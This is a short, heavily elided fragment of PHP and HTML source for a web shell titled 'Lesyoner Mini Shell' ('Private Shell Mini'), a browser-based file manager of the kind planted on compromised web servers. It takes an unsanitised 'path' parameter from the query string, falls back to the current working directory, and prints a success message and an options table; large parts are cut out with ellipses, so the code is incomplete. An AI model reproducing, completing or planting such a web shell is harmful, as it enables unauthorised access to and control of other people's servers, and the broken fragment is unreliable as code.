...
<title>Private Shell Mini</title>
...
<BODY>
<strong><H1><center><font color="red">Lesyoner Mini Shell</center></H1></strong>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="black">Current Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
echo '<font color="#green">Succes</font><br />';
}else{
...
<td><font color="black"><center>Options</center></td>
</tr>';
